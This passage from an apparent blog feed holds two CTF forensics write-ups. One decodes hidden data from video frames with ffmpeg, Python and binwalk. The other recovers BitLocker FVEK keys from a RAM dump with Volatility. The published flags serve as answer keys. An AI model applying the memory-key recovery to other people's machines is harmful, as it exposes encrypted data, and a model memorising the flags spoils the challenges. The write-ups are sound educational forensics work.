data</span><br><span class="line">2. Padding to a size that is a multiple of (6*width*height) bits</span><br><span class="line">3. Splitting the data into “subframes” of size (2*width*height) bits</span><br><span class="line">4. Writes data to video frames, which each triplet of three consecutive subframes are written to the red, green, and blue channels of one frame, respectively</span><br><span class="line">     Data written in row-major order</span><br><span class="line">     2 bits per pixel per channel</span><br><span class="line">THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.</span><br></pre></td></tr></table></figure><p>WorkFlow:- </p><ol><li><p>Extraction of Frames:<br> Utilizes FFmpeg to extract frames from the video.</p></li><li><p>Extraction of Pixel Data:<br> Decodes the RGB channels of each frame.<br> Extracts 2 bits per pixel per channel</p></li><li><p>Reconstruction of Binary Data:<br>Combines the extracted bits into a single stream.<br>Reconstructs the original binary data by converting the bits back into bytes.</p></li></ol><p>For Extraction of Frames:-</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ffmpeg -i static.mp4 frame_%04d.png</span><br></pre></td></tr></table></figure><p>Using ffmpeg, we extracted 72 frames in PNG format from the MP4 video.</p><p><img src="/images/posts/2024-bcactf/frames.png" alt="Image 2"></p><p>Next, I wrote a Python script to accomplish steps 2 and 3.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_frames</span>(<span class="params">frame_prefix, frame_count, width=<span class="number">256</span>, height=<span class="number">256</span></span>):</span><br><span class="line">    channels = [<span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]</span><br><span class="line">    bit_position = <span class="number">4</span>  <span class="comment"># Bit position(4or6) chosen based on successful MD5 checksum match, were taken bitpositions [2,4,6,8]</span></span><br><span class="line">    </span><br><span class="line">    data_bits = []</span><br><span class="line">    <span class="keyword">for</span> frame_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, frame_count + <span class="number">1</span>):</span><br><span class="line">        frame_path = <span class="string">f&quot;<span class="subst">&#123;frame_prefix&#125;</span><span class="subst">&#123;frame_idx:04d&#125;</span>.png&quot;</span></span><br><span class="line">        frame = Image.<span class="built_in">open</span>(frame_path)</span><br><span class="line">        frame = frame.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">        pixels = np.array(frame)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Extract the specified bits from each color channel</span></span><br><span class="line">        r_channel = (pixels[:, :, <span class="number">0</span>] &amp; (<span class="number">0b11</span> &lt;&lt; bit_position)) &gt;&gt; bit_position</span><br><span class="line">        g_channel = (pixels[:, :, <span class="number">1</span>] &amp; (<span class="number">0b11</span> &lt;&lt; bit_position)) &gt;&gt; bit_position</span><br><span class="line">        b_channel = (pixels[:, :, <span class="number">2</span>] &amp; (<span class="number">0b11</span> &lt;&lt; bit_position)) &gt;&gt; bit_position</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Flatten the channels and convert to bit strings</span></span><br><span class="line">        <span class="keyword">for</span> bits <span class="keyword">in</span> r_channel.flatten():</span><br><span class="line">            data_bits.append(<span class="built_in">format</span>(bits, <span class="string">&#x27;02b&#x27;</span>))</span><br><span class="line">        <span class="keyword">for</span> bits <span class="keyword">in</span> g_channel.flatten():</span><br><span class="line">            data_bits.append(<span class="built_in">format</span>(bits, <span class="string">&#x27;02b&#x27;</span>))</span><br><span class="line">        <span class="keyword">for</span> bits <span class="keyword">in</span> b_channel.flatten():</span><br><span class="line">            data_bits.append(<span class="built_in">format</span>(bits, <span class="string">&#x27;02b&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(data_bits)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_padding</span>(<span class="params">data_bits, width, height</span>):</span><br><span class="line">    size = <span class="number">6</span> * width * height</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The size is&quot;</span>, size)</span><br><span class="line">    actual_size = <span class="built_in">len</span>(data_bits)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;The actual size is &#x27;</span>, actual_size)</span><br><span class="line">    <span class="keyword">if</span> actual_size % size == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Multiple of size&quot;</span>)</span><br><span class="line">        <span class="comment"># No padding to remove</span></span><br><span class="line">        <span class="keyword">return</span> data_bits   <span class="comment"># size was already in multiple so need for removing the padding.</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Calculate the number of excess bits to remove</span></span><br><span class="line">    padding_size = actual_size % size</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Remove the excess bits</span></span><br><span class="line">    data_bits = data_bits[:-padding_size]</span><br><span class="line">    <span class="keyword">return</span> data_bits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bits_to_bytes</span>(<span class="params">data_bits</span>):</span><br><span class="line">    byte_arr = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data_bits), <span class="number">8</span>):</span><br><span class="line">        byte = data_bits[i:i+<span class="number">8</span>]</span><br><span class="line">        byte_arr.append(<span class="built_in">int</span>(byte, <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(byte_arr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_md5</span>(<span class="params">data</span>):</span><br><span class="line">    md5 = hashlib.md5(data).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> md5</span><br><span class="line"></span><br><span class="line"><span class="comment"># Parameters</span></span><br><span class="line">frame_prefix = <span class="string">&#x27;frame_&#x27;</span></span><br><span class="line">frame_count = <span class="number">72</span>  <span class="comment"># Total number of frames</span></span><br><span class="line">width = <span class="number">256</span></span><br><span class="line">height = <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decode frames</span></span><br><span class="line">data_bits = decode_frames(frame_prefix, frame_count, width, height)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Checking padding</span></span><br><span class="line">data_bits = check_padding(data_bits, width, height)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert bits to bytes</span></span><br><span class="line">compressed_data = bits_to_bytes(data_bits)</span><br><span class="line"></span><br><span class="line">output_path = <span class="string">&#x27;extracted_data.bin&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(compressed_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Extracted data saved.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate and print MD5 checksum</span></span><br><span class="line">calculated_md5 = calculate_md5(compressed_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;MD5 checksum of extracted data after removing padding: <span class="subst">&#123;calculated_md5&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>The extracted bin matches the MD5 checksum provided in the description. As I began analyzing the file, I employed several tools. When I used binwalk, it indicated the presence of Zlib compressed data, which I then extracted.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -e extracted_data.bin</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">40522         0x9E4A          Zlib compressed data, default compression</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>There are two approaches: one is quick and easy, while the other is little time-consuming.<br>This is the quick and easy method for lazy people like me to get the flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">g4rud4:~/Pictures/_extracted_data.bin.extracted$ <span class="built_in">ls</span></span><br><span class="line">9E4A  9E4A.zlib</span><br><span class="line">g4rud4:~/Pictures/_extracted_data.bin.extracted$ strings * | grep bcactf&#123;</span><br><span class="line">bootpc[[ --bootfile %bootfile%]] --dev %iface%[[ --server %server%]][[ --hwaddr %hwaddr%]] --returniffail --serverbcast</span><br><span class="line">can<span class="string">&#x27;t enable bcast on ARP socket</span></span><br><span class="line"><span class="string">bcache</span></span><br><span class="line"><span class="string">sbcast</span></span><br><span class="line"><span class="string">nulsohstxetxeotenqackbel bs ht nl vt ff cr so sidledc1dc2dc3dc4naksynetbcan emsubesc fs gs rs us sp</span></span><br><span class="line"><span class="string">http-alt    8080/tcp    webcache    # WWW caching service</span></span><br><span class="line"><span class="string">TTJvQS8TUoKU1xrBeKJR3Stwbbca+few4GeXVtt8YVMJAygCQMez2P2ccGrGKMOF</span></span><br><span class="line"><span class="string">bcactf&#123;imag3_PROc3sSINg_yaY_2ea104d700c1a8&#125;</span></span><br></pre></td></tr></table></figure><p>Another one is to do it proper way:- </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ zlib-flate -uncompress &lt; 9E4A.zlib &gt; output</span><br><span class="line">$ exiftool output</span><br><span class="line">$ file output</span><br><span class="line">output: POSIX tar archive</span><br></pre></td></tr></table></figure><p>I began extracting the tar archive once we obtained it.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tar -xf output</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin  dev  etc  home  lib  out</span><br></pre></td></tr></table></figure><p>We got some folders let’s check out </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ tree .</span><br><span class="line">.</span><br><span class="line">├── bin</span><br><span class="line">│   ├── <span class="built_in">arch</span> -&gt; /bin/busybox</span><br><span class="line">│   ├── ash -&gt; /bin/busybox</span><br><span class="line">│   ├── <span class="built_in">base64</span> -&gt; /bin/busybox</span><br><span class="line">│   ├── bbconfig -&gt; /bin/busybox</span><br><span class="line">...</span><br><span class="line">├── home</span><br><span class="line">│   └── admin</span><br><span class="line">│       └── Documents</span><br><span class="line">│           ├── not_social_security_number.txt</span><br><span class="line">│           └── social_security_number.txt</span><br><span class="line">└── lib</span><br><span class="line">    ├── apk</span><br><span class="line">    │   ├── db</span><br><span class="line">    │   │   ├── installed</span><br><span class="line">    │   │   ├── lock</span><br><span class="line">    │   │   ├── scripts.tar</span><br><span class="line">    │   │   └── triggers</span><br><span class="line">    │   └── <span class="built_in">exec</span></span><br><span class="line">    ├── firmware</span><br><span class="line">    ├── ld-musl-x86_64.so.1</span><br><span class="line">    ├── libapk.so.2.14.0</span><br><span class="line">    ├── libc.musl-x86_64.so.1 -&gt; ld-musl-x86_64.so.1</span><br><span class="line">    └── libcrypto.so.3</span><br><span class="line"></span><br><span class="line">45 directories, 145 files</span><br></pre></td></tr></table></figure><p>I began searching for the text files in the admin directories.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/home/admin/Documents$ <span class="built_in">cat</span> not_social_security_number.txt</span><br><span class="line">bcactf&#123;imag3_PROc3sSINg_yaY_2ea104d700c1a8&#125;</span><br></pre></td></tr></table></figure><p>Hooray!!! We captured the flag just 3 minutes before the CTF ended. ;p</p><h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h4><p><code>bcactf&#123;imag3_PROc3sSINg_yaY_2ea104d700c1a8&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;BCACTF 5.0!&lt;/p&gt;
&lt;p&gt;Returning for its fifth consecutive year, this high school CTF hosted by the Bergen County Academies offers challenges</summary>
      
    
    
    
    <category term="CTF-Writeups" scheme="https://g4rud4kun.github.io/categories/CTF-Writeups/"/>
    
    
    <category term="forensics" scheme="https://g4rud4kun.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>BYUCTF 2024</title>
    <link href="https://g4rud4kun.github.io/2024/05/20/BYUCTF-2024/"/>
    <id>https://g4rud4kun.github.io/2024/05/20/BYUCTF-2024/</id>
    <published>2024-05-20T15:10:36.000Z</published>
    <updated>2025-05-18T11:34:00.742Z</updated>
    
    <content type="html"><![CDATA[<p>BYUCTF 2024!</p><p>I participated in BYUCTF 2024, organized by BYU Cyberia, as a member of my institute’s club, InfoSecIITR. Our team secured 5th place globally. This writeup details the challenge I solved during the competition.</p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Not-again-I’ve-been-BitLockered-out-of-my-own-computer"><a href="#Not-again-I’ve-been-BitLockered-out-of-my-own-computer" class="headerlink" title="Not again! I’ve been BitLockered out of my own computer!"></a>Not again! I’ve been BitLockered out of my own computer!</h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>Install Bitlocker they said… it will protect your data they said… Well, now I don’t have access to any of my data because I forgot my password… again! Can you find my FVEK keys? I managed to capture my RAM so they should be in there</p><p>Flag format - <code>byuctf&#123;key1_key2_key3&#125;</code> (order not significant)</p><ul><li>Mirror 1 - <a href="https://byu.box.com/s/paexcd1t1er8bj435gg88i52q9ho8ftf">https://byu.box.com/s/paexcd1t1er8bj435gg88i52q9ho8ftf</a></li><li>Mirror 2 - <a href="https://drive.google.com/file/d/1EAYpFu0ULc4fGt2qNoJTaNvG4F9A8Vw7/view?usp=sharing">https://drive.google.com/file/d/1EAYpFu0ULc4fGt2qNoJTaNvG4F9A8Vw7/view?usp=sharing</a></li></ul><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>As the user has captured the RAM, provided to us as the 20240327.mem file, I started searching for BitLocker. We found a plugin for the <a href="https://github.com/volatilityfoundation/volatility">Volatility2</a> tool at <a href="https://github.com/breppo/Volatility-BitLocker">GitHub Repo</a>. Since the file is also a memory file, it was straightforward to use the plugin.</p><p>First, we needed the profile, so I used the following command in my terminal(using Volatility2):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python2 vol.py -f 20240327.mem imageinfo</span><br></pre></td></tr></table></figure><p>It took a lot of time about 7-8 minutes—but eventually, it provided the profile <code>Win10x64_19041</code>. After that, I used the BitLocker plugin:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python2 vol.py -f 20240327.mem --profile=Win10x64_19041 bitlocker</span><br></pre></td></tr></table></figure><p>We got 5 FVEK keys, but after trying some possible combinations, I realized only Win8+ was accepted.</p><p>I’ve provided the solution’s image.</p><p><img src="/images/posts/2024-byuctf/not_again.png" alt="Solution"></p><h4 id="Flags"><a href="#Flags" class="headerlink" title="Flags"></a>Flags</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">byuctf&#123;968052b6b247b32f6cfecce39749785f_91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b_91d4cceb5bf238cb3cb96367314773f5&#125;</span><br><span class="line">byuctf&#123;968052b6b247b32f6cfecce39749785f_91d4cceb5bf238cb3cb96367314773f5_91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b&#125;</span><br><span class="line">byuctf&#123;91d4cceb5bf238cb3cb96367314773f5_968052b6b247b32f6cfecce39749785f_91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b&#125;</span><br><span class="line">byuctf&#123;91d4cceb5bf238cb3cb96367314773f5_91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b_968052b6b247b32f6cfecce39749785f&#125;</span><br><span class="line">byuctf&#123;91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b_91d4cceb5bf238cb3cb96367314773f5_968052b6b247b32f6cfecce39749785f&#125;</span><br><span class="line">byuctf&#123;91c75f658705c36090f03779cacb056179e16316ee4af1e90d0f84e090b88d8b_968052b6b247b32f6cfecce39749785f_91d4cceb5bf238cb3cb96367314773f5&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;BYUCTF 2024!&lt;/p&gt;
&lt;p&gt;I participated in BYUCTF 2024, organized by BYU Cyberia, as a member of my institute’s club, InfoSecIITR. Our team se</summary>
      
    
    
    
    <category term="CTF-Writeups" scheme="https://g4rud4kun.github.io/categories/CTF-Writeups/"/>
    
    
    <category term="forensics" scheme="https://g4rud4kun.github.io/tags/forensics/"/>
    
    <category term="volatility" scheme="https://g4rud4kun.github.io/tags/volatility/"/>
    
  </entry>
  
</feed>
